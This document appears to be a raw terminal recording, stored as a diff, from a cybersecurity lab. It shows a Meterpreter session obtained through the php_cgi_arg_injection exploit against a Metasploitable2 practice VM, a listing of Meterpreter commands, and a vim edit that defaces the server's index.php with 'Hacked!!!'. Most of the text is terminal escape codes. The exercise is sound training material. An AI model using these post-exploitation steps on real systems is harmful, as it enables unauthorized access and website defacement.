+    enable_unico  Enables encoding of unicode strings
+    de_encoding
+    exit          Terminate the meterpreter session
+    guid          Get the session GUID
+    help          Help menu
+    info          Displays information about a Post module
+    irb           Open an interactive Ruby shell on the current session
+    load          Load one or more meterpreter extensions
+    machine_id    Get the MSF ID of the machine attached to the session
+    pry           Open the Pry debugger on the current session
+    quit          Terminate the meterpreter session
+    read          Reads data from a channel
+    resource      Run the commands stored in a file
+    run           Executes a meterpreter script or Post module
+    secure        (Re)Negotiate TLV packet encryption on the session
+    sessions      Quickly switch to another session
+    use           Deprecated alias for "load"
+    uuid          Get the UUID for the current session
+    write         Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+[4mmeterpreter[0m > write "Hola[K[K[Ki, [K[K[Kolaaaa" > e.php
+[0m[1m[31m[-][0m Invalid channel identifier specified.
+[4mmeterpreter[0m > echo "Hola"
+[0m[1m[31m[-][0m Unknown command: echo
+[4mmeterpreter[0m > e[Kphp
+[0m[1m[31m[-][0m Unknown command: php
+[4mmeterpreter[0m > write e.php <<< "Hola!!"
+[0m[1m[31m[-][0m Invalid channel identifier specified.
+[4mmeterpreter[0m > write "Hola"
+[0m[1m[31m[-][0m Invalid channel identifier specified.
+[4mmeterpreter[0m > edit index.h[Kphp
+[0m[?1006;1000h[?1002h[?1049h[22;0;0t[>4;2m[?1h=[?2004h[?1004h[1;39r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[39;1H"/tmp/meterp20230724-18058-u0cikk" 29L, 891B[2;1H▽[6n[2;1H  [3;1HPzz\[0%m[6n[3;1H           [1;1H[>c]10;?]11;?[1;1H<html><head><title>Metasploitable2 - Linux</title></head><body>
+<pre>[2;6H[K[3;1H[K[4;17H_[18C_[7C_ _[8C_     _      ____
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|[9;29H|_|
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+</pre>
+<ul>
+<li><a href="/twiki/">TWiki</a></li>
+<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
+<li><a href="/mutillidae/">Mutillidae</a></li>
+<li><a href="/dvwa/">DVWA</a></li>
+<li><a href="/dav/">WebDAV</a></li>
+</ul>
+</body>
+</html>
+
+[94m~                                                                                                                                                                      [31;1H~                                                                                                                                                                      [32;1H~                                                                                                                                                                      [33;1H~                                                                                                                                                                      [34;1H~                                                                                                                                                                      [35;1H~                                                                                                                                                                      [36;1H~                                                                                                                                                                      [37;1H~                                                                                                                                                                      [38;1H~                                                                                                                                                                      [m[39;150H1,1[11CAll[1;1H[?25h[?4m[?25l[39;140H~@k[1;1H[39;140H   [1;2H[39;152H2[1;2H[?25h[?25l[39;140H~@k[1;2H[39;140H   [2;2H[39;150H2[2;2H[?25h[?25l[39;140H~@k[2;2H[39;140H   [3;1H[39;150H3,0-1[3;1H[?25h[?25l[39;140H~@k[3;1H[39;140H   [4;2H[39;150H4,2  [4;2H[?25h[?25l[39;140H~@k[4;2H[39;140H   [5;2H[39;150H5[5;2H[?25h[?25l[39;140H~@k[5;2H[39;140H   [6;2H[39;150H6[6;2H[?25h[?25l[39;140H~@k[6;2H[39;140H   [7;2H[39;150H7[7;2H[?25h[?25l[39;140H~@k[7;2H[39;140H   [8;2H[39;150H8[8;2H[?25h[?25l[39;140H~@k[8;2H[39;140H   [9;2H[39;150H9[9;2H[?25h[?25l[39;140H~@k[9;2H[39;140H   [10;1H[39;150H10,0-1[10;1H[?25h[?25l[39;140H~@k[10;1H[39;140H   [11;1H[39;151H1[11;1H[?25h[?25l[39;140H~@k[11;1H[39;140H   [12;2H[39;151H2,2  [12;2H[?25h[?25l[39;140H~@k[12;2H[39;140H   [13;1H[39;151H3,0-1[13;1H[?25h[?25l[39;140H~@k[13;1H[39;140H   [14;2H[39;151H4,2  [14;2H[?25h[?25l[39;140H~@k[14;2H[39;140H   [15;1H[39;151H5,0-1[15;1H[?25h[?25l[39;140H~@k[15;1H[39;140H   [16;2H[39;151H6,2  [16;2H[?25h[?25l[39;140H~@k[16;2H[39;140H   [17;1H[39;151H7,0-1[17;1H[?25h[?25l[39;140H~@k[17;1H[39;140H   [18;1H[39;151H8[18;1H[?25h[?25l[39;140H~@k[18;1H[39;140H   [19;2H[39;151H9,2  [19;2H[?25h[?25l[39;140H~@k[19;2H[39;140H   [20;2H[39;150H20[20;2H[?25h[?25l[39;140H~@k[20;2H[39;140H   [21;2H[39;151H1[21;2H[?25h[?25l[39;140H~@k[21;2H[39;140H   [22;2H[39;151H2[22;2H[?25h[?25l[39;140H~@k[22;2H[39;140H   [23;2H[39;151H3[23;2H[?25h[?25l[39;140H~@k[23;2H[39;140H   [24;2H[39;151H4[24;2H[?25h[?25l[39;140H~@k[24;2H[39;140H   [25;2H[39;151H5[25;2H[?25h[?25l[39;140H~@k[25;2H[39;140H   [26;2H[39;151H6[26;2H[?25h[?25l[39;140H~@k[26;2H[39;140H   [26;1H[39;153H1[26;1H[?25h[?25l[39;140HH[26;1H[39;140H [1;1H[39;150H1,1 [1;1H[?25h[?25l[39;140H~@k[1;1H[39;140H   [2;1H[39;150H2[2;1H[?25h[?25l[39;140H~@k[2;1H[39;140H   [3;1H[39;150H3,0-1[3;1H[?25h[?25l[39;140H~@k[3;1H[39;140H   [4;1H[39;150H4,1  [4;1H[?25h[?25l[39;140H~@k[4;1H[39;140H   [5;1H[39;150H5[5;1H[?25h[?25l[39;140H~@k[5;1H[39;140H   [6;1H[39;150H6[6;1H[?25h[?25l[39;140H~@k[6;1H[39;140H   [7;1H[39;150H7[7;1H[?25h[?25l[39;140H~@k[7;1H[39;140H   [8;1H[39;150H8[8;1H[?25h[?25l[39;140H~@k[8;1H[39;140H   [9;1H[39;150H9[9;1H[?25h[?25l[39;140H~@k[9;1H[39;140H   [10;1H[39;150H10,0-1[10;1H[?25h[?25l[39;140H~@k[10;1H[39;140H   [11;1H[39;151H1[11;1H[?25h[?25l[39;140H~@k[11;1H[39;140H   [12;1H[39;151H2,1  [12;1H[?25h[?25l[39;140H~@k[12;1H[39;140H   [13;1H[39;151H3,0-1[13;1H[?25h[?25l[39;140H~@k[13;1H[39;140H   [14;1H[39;151H4,1  [14;1H[?25h[?25l[39;140H~@k[14;1H[39;140H   [15;1H[39;151H5,0-1[15;1H[?25h[?25l[39;140H~@k[15;1H[39;140H   [16;1H[39;151H6,1  [16;1H[?25h[?25l[39;140H~@k[16;1H[39;140H   [17;1H[39;151H7,0-1[17;1H[?25h[?25l[39;140H~@k[17;1H[39;140H   [18;1H[39;151H8[18;1H[?25h[?25l[39;140H~@k[18;1H[39;140H   [19;1H[39;151H9,1  [19;1H[?25h[?25l[39;140H~@k[19;1H[39;140H   [20;1H[39;150H20[20;1H[?25h[?25l[39;140H~@k[20;1H[39;140H   [21;1H[39;151H1[21;1H[?25h[?25l[39;140H~@k[21;1H[39;140H   [22;1H[39;151H2[22;1H[?25h[?25l[39;140H~@k[22;1H[39;140H   [23;1H[39;151H3[23;1H[?25h[?25l[39;140H~@k[23;1H[39;140H   [24;1H[39;151H4[24;1H[?25h[?25l[39;140H~@k[24;1H[39;140H   [25;1H[39;151H5[25;1H[?25h[?25l[39;140H~@k[25;1H[39;140H   [26;1H[39;151H6[26;1H[?25h[?25l[39;140He[26;1H[39;140H [26;2H[39;153H2[26;2H[?25h[?25l[39;140H~@k[26;2H[39;140H   [26;1H[39;153H1[26;1H[?25h[?25l[39;140He[26;1H[39;140H [26;2H[39;153H2[26;2H[?25h[?25l[39;140H~@k[26;2H[39;140H   [26;1H[39;153H1[26;1H[?25h[?25l[39;140Hd[26;1H[?25h[?25l[39;141Hc[26;1H[39;140H  [26;1H[?25h[?25l[39;140Hd[26;1H[?25h[?25l[39;141Hd[26;1H[39;140H  [26;1H[26;38r[38;1H
+[1;39r[38;1H[94m~                                                                                                                                                                      [m[39;1H[K[39;150H26,1[10CAll[26;1H[?25h[?25l[39;140Hq[26;1H[?25h[?25l[39;141He[26;1H[39;1H[1mrecording @e[m[39;140H[K[39;150H26,1[10CAll[26;1H[?25h[?25l[39;140He[26;1H[39;140H [26;2H[39;153H2[26;2H[?25h[?25l[39;140He[26;2H[39;140H [26;6H[39;153H6[26;6H[?25h[?25l[39;140He[26;6H[39;140H [26;7H[39;153H7[26;7H[?25h[?25l[39;140Hw[26;7H[39;140H [27;1H[39;151H7,1[27;1H[?25h[?25l[39;140Hw[27;1H[39;140H [27;3H[39;153H3[27;3H[?25h[?25l[39;140Hs[27;3H[39;140H [27;3H[39;140Hcl[27;3H[39;140H  [27;3H[39;1H[1m--c INSERT --[m [1mrecording @e[m[39;150H[K[39;150H27,3[10CAll[27;3Html>[27;7H[K[27;3H[?25h[?25lhtml>[39;153H4[27;4H[?25h[?25l[39;151H6[26;4H[?25h[?25l[39;153H3[26;3H[?25h[?25l[39;153H2[26;2H[?25h[?25l[39;153H1[26;1H[?25h[?25lh</body>[39;153H2[26;2H[?25h[?25l</body>[26;8H[K[39;153H1[26;1H[?25h[?25l¿[26;2H</body>[39;153H3-2[26;2H[?25h[?25l</body>[26;8H[K[39;153H1  [26;1H[?25h[?25l¡[26;2H</body>[39;153H3-2[26;2H[?25h[?25lH</body>[39;153H4-3[26;3H[?25h[?25le</body>[39;153H5-4[26;4H[?25h[?25lm</body>[39;153H6-5[26;5H[?25h[?25lo</body>[39;153H7-6[26;6H[?25h[?25ls</body>[39;153H8-7[26;7H[?25h[?25l </body>[39;153H9-8[26;8H[?25h[?25lh</body>[39;153H10-9[26;9H[?25h[?25la</body>[39;154H1-10[26;10H[?25h[?25l</body>[26;16H[K[39;154H0-9 [26;9H[?25h[?25l</body>[26;15H[K[39;153H9-8 [26;8H[?25h[?25l</body>[26;14H[K[39;153H8-7[26;7H[?25h[?25l</body>[26;13H[K[39;153H7-6[26;6H[?25h[?25l</body>[26;12H[K[39;153H6-5[26;5H[?25h[?25l</body>[26;11H[K[39;153H5-4[26;4H[?25h[?25l</body>[26;10H[K[39;153H4-3[26;3H[?25h[?25l</body>[26;9H[K[39;153H3-2[26;2H[?25h[?25lS</body>[39;153H4-3[26;3H[?25h[?25le</body>[39;153H5-4[26;4H[?25h[?25l </body>[39;153H6-5[26;5H[?25h[?25lh</body>[39;153H7-6[26;6H[?25h[?25la</body>[39;153H8-7[26;7H[?25h[?25l </body>[39;153H9-8[26;8H[?25h[?25l"</body>[39;153H10-9[26;9H[?25h[?25lh</body>[39;154H1-10[26;10H[?25h[?25la</body>[39;154H2-11[26;11H[?25h[?25lc</body>[39;154H3-12[26;12H[?25h[?25lk</body>[39;154H4-13[26;13H[?25h[?25le</body>[39;154H5-14[26;14H[?25h[?25la</body>[39;154H6-15[26;15H[?25h[?25ld</body>[39;154H7-16[26;16H[?25h[?25lo</body>[39;154H8-17[26;17H[?25h[?25l"</body>[39;154H9-18[26;18H[?25h[?25l </body>[39;153H20-19[26;19H[?25h[?25lc</body>[39;154H1-20[26;20H[?25h[?25lo</body>[39;154H2-21[26;21H[?25h[?25ln</body>[39;154H3-22[26;22H[?25h[?25l </body>[39;154H4-23[26;23H[?25h[?25l{</body>[39;154H5-24[26;24H[?25h[?25le</body>[39;154H6-25[26;25H[?25h[?25lx</body>[39;154H7-26[26;26H[?25h[?25l</body>[26;32H[K[39;154H6-25[26;25H[?25h[?25l</body>[26;31H[K[39;154H5-24[26;24H[?25h[?25l</body>[26;30H[K[39;154H4-23[26;23H[?25h[?25lé[26;24H</body>[39;154H6-24[26;24H[?25h[?25lx</body>[39;154H7-25[26;25H[?25h[?25li</body>[39;154H8-26[26;26H[?25h[?25lt</body>[39;154H9-27[26;27H[?25h[?25lo</body>[39;153H30-28[26;28H[?25h[?25l </body>[39;154H1-29[26;29H[?25h[?25le</body>[39;154H2-30[26;30H[?25h[?25ll</body>[39;154H3-31[26;31H[?25h[?25l </body>[39;154H4-32[26;32H[?25h[?25lp</body>[39;154H5-33[26;33H[?25h[?25lu</body>[39;154H6-34[26;34H[?25h[?25le</body>[39;154H7-35[26;35H[?25h[?25lr</body>[39;154H8-36[26;36H[?25h[?25lt</body>[39;154H9-37[26;37H[?25h[?25lo</body>[39;153H40-38[26;38H[?25h[?25l </body>[39;154H1-39[26;39H[?25h[?25l8</body>[39;154H2-40[26;40H[?25h[?25l0</body>[39;154H3-41[26;41H[?25h[?25l/</body>[39;154H4-42[26;42H[?25h[?25lT</body>[39;154H5-43[26;43H[?25h[?25lC</body>[39;154H6-44[26;44H[?25h[?25lP</body>[39;154H7-45[26;45H[?25h[?25l!</body>[39;154H8-46[26;46H[?25h[?25l </body>[39;154H9-47[26;47H[?25h[39;1H[1mrecording @er[m[39;13H[K[26;46H[?25l[39;140H^[[26;46H[39;140H  [26;47H[39;150H26,48-46      All[26;46H[?25h[?25l[39;140HS[26;46H[39;140H [26;46H[39;140Hcc[26;46H[39;140H  [26;1H[39;1H[1m--c INSERT --[m [1mrecording @e[m[39;150H[K[39;150H26,1[10CAll[26;1H[K[26;1H[?25h[?25lZ[39;153H2[26;2H[?25h[?25l[26;1H[K[39;153H1[26;1H[?25h[?25l[38;5;81m^Z[m[39;153H2-3[26;3H[?25h[?25l[38;5;81m^Z[m[39;153H3-5[26;5H[?25h[?25l[26;3H[K[39;153H2-3[26;3H[?25h[?25l[26;1H[K[39;153H1  [26;1H[?25h[?25l¿[39;153H3-2[26;2H[?25h[?25l[26;1H[K[39;153H1  [26;1H[?25h[?25ls[39;153H2[26;2H[?25h[?25lE[39;153H3[26;3H[?25h[?25l[26;2H[K[39;153H2[26;2H[?25h[?25l[26;1H[K[39;153H1[26;1H[?25h[?25lH[39;153H2[26;2H[?25h[?25la[39;153H3[26;3H[?25h[?25lc[39;153H4[26;4H[?25h[?25lk[39;153H5[26;5H[?25h[?25le[39;153H6[26;6H[?25h[?25ld[39;153H7[26;7H[?25h[?25l![39;153H8[26;8H[?25h[?25l![39;153H9[26;9H[?25h[?25l![39;153H10[26;10H[?25h[?25l:[39;154H1[26;11H[?25h[?25l[26;10H[K[39;154H0[26;10H[?25h[?25l[27;38r[27;1H[L[1;39r[39;150H[K[39;150H27,1[10CAll[27;1H[?25h[?25l[38;5;81m^S[m[39;153H2-3[27;3H[?25h[?25l[27;1H[K[39;153H1  [27;1H[?25h[?25l[26;38r[38;1H
+[1;39r[26;1HHacked!!![38;1H[94m~                                                                                                                                                                      [m[39;150H[K[39;150H26,10[9CAll[26;10H[?25h[?25le[39;154H1[26;11H[?25h[?25l[26;10H[K[39;154H0[26;10H[?25h[?25l@[39;154H1[26;11H[?25h[?25le[39;154H2[26;12H[?25h[?25l[26;11H[K[39;154H1[26;11H[?25h[?25l[26;10H[K[39;154H0[26;10H[?25h[?25l[39;151H4,35[24;35H[?25h[?25l[39;151H5,36[25;36H[?25h[?25l[39;151H6,10[26;10H[?25h[?25l[39;151H7,8 [27;8H[?25h[?25l[39;151H8,1[28;1H[?25h[?25l-[39;153H2[28;2H[?25h[?25l[28;1H[K[39;153H1[28;1H[?25h[?25ls[39;153H2[28;2H[?25h[?25ls[39;153H3[28;3H[?25h[?25l[28;2H[K[39;153H2[28;2H[?25h[?25l[28;1H[K[39;153H1[28;1H[?25h[?25l[38;5;81m^S[m[39;153H2-3[28;3H[?25h[?25l[28;1H[K[39;153H1  [28;1H[?25h[?25l[94m~                                                                                                                                                                      [m[39;151H7,8[27;8H[?25h[?25l[28;1H[K[39;151H8,1[28;1H[?25h[?25l:[39;153H2[28;2H[?25h[?25lw[39;153H3[28;3H[?25h[?25lq[39;153H4[28;4H[?25h[?25l[39;153H5-9[28;9H[?25h[?25l[39;153H4  [28;4H[?25h[?25l[29;1H[K[39;151H9,1[29;1H[?25h[?25l[94m~                                                                                                                                                                      [m[39;151H8,4[28;4H[?25h[?25l[28;3H[K[39;153H3[28;3H[?25h[?25l[28;2H[K[39;153H2[28;2H[?25h[?25l[28;1H[K[39;153H1[28;1H[?25h[39;1H[1mrecording @er[m[39;13H[K[28;1H[?25l[39;140H^[[28;1H[39;140H  [28;1H[39;150H28,0-1[8CAll[28;1H[?25h[?25l[39;140Hw[28;1H[39;140H [28;1H[?25h[?25l[39;140Hq[28;1H[39;1H[K[28;1H[39;150H28,0-1[8CAll[28;1H[?25h[?25l[39;140H:[28;1H[39;140H[K[39;1H:[?25hwq[?25l[?1006;1000l[?1002l[?2004l[>4;m"/tmp/meterp20230724-18058-u0cikk" 28L, 887B written[23;2t[23;1t
+[?1004l[?2004l[?1l>[?1049l[23;0;0t[?25h[>4;m[4mmeterpreter[0m > [0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 192.168.56.101 - Meterpreter session 1 closed.  Reason: Died
+[4mmsf6[0m exploit([1m[31mmulti/http/php_cgi_arg_injection[0m) [0m> [0m                                                                                                                                                                       ]0;kali@kali: ~/laboratorio-ciberseguridad/80_TCP
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/laboratorio-ciberseguridad/80_TCP[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[?2004l
+
+Script done on 2023-07-24 18:03:19-04:00 [COMMAND_EXIT_CODE="0"]
